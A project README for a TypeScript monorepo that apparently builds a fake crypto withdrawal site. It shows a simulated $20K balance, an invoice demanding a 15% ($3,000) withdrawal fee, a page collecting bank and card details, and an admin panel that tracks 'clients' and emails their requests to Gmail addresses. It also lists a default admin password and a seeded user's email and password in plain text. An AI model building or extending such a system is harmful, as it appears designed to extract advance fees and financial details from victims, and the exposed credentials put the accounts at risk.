# Workspace

## Overview

pnpm workspace monorepo using TypeScript. Each package manages its own dependencies.

## Stack

- **Monorepo tool**: pnpm workspaces
- **Node.js version**: 24
- **Package manager**: pnpm
- **TypeScript version**: 5.9
- **API framework**: Express 5
- **Database**: PostgreSQL + Drizzle ORM
- **Validation**: Zod (`zod/v4`), `drizzle-zod`
- **API codegen**: Orval (from OpenAPI spec)
- **Build**: esbuild (CJS bundle)

## Artifacts

- **CryptoVault** (`artifacts/crypto-dashboard`) — React/Vite dark-themed crypto withdrawal dashboard at `/`
  - Auth (simulated), $20K balance, trade/convert/market tabs, wallet actions, transaction history
  - Invoice page: 15% fee ($3,000) on $20K withdrawal with 8 dynamically-weighted line items and staple SVG decoration
  - Link Account page: 190+ countries, 70+ currencies, bank search, card preview

- **Firm Admin Dashboard** (`artifacts/admin-dashboard`) — Internal admin dashboard at `/admin-dashboard/`
  - Password-protected login (default: `admin` / `Admin2026!`)
  - Client management (CRUD, status approvals: pending/active/approved/denied)
  - Service request tracking (withdrawal/payment/other, approve/deny)
  - Activity log (chronological event timeline)
  - Email notifications to `Opticspycyber@gmail.com` on new client registrations and service requests
  - Requires `SMTP_USER` + `SMTP_PASS` env vars (Gmail App Password) for email; gracefully skips if not set

- **API Server** (`artifacts/api-server`) — Express API at `/api`
  - Admin routes: `/api/admin/login`, `/api/admin/clients`, `/api/admin/requests`, `/api/admin/stats`, `/api/admin/activity`
  - Auth: `X-Admin-Token: <username>:<password>` header (env vars: `ADMIN_USERNAME`, `ADMIN_PASSWORD`)
  - User auth routes: `/api/auth/signup`, `/api/auth/login`, `/api/auth/logout`, `/api/auth/me` (Bearer token in `Authorization` header)
  - Passwords are hashed server-side with PBKDF2 (sha256, 210k iterations) and stored in the `users` table; sessions live in `user_sessions` and last 30 days
  - Optional `SUPPORT_EMAIL` env var overrides the default support/admin contact address (`Opticspycrew@gmail.com`) shown in the password-changed user email and used as the recipient of admin notification emails
  - Primary user `pgeitz@hotmail.com` / `Centuryhacks` is seeded into the `users` table on startup if missing

## Database Tables

- `admin_clients` — firm client records
- `admin_service_requests` — withdrawal/payment/other requests linked to clients
- `admin_activity_log` — chronological event log
- `users` — CryptoVault end-user accounts (server-side, PBKDF2-hashed passwords)
- `user_sessions` — opaque bearer tokens for end-user sessions (30-day expiry)

## Key Commands

- `pnpm run typecheck` — full typecheck across all packages
- `pnpm run build` — typecheck + build all packages
- `pnpm --filter @workspace/api-spec run codegen` — regenerate API hooks and Zod schemas from OpenAPI spec
- `pnpm --filter @workspace/db run push` — push DB schema changes (dev only)
- `pnpm --filter @workspace/api-server run dev` — run API server locally

See the `pnpm-workspace` skill for workspace structure, TypeScript setup, and package details.
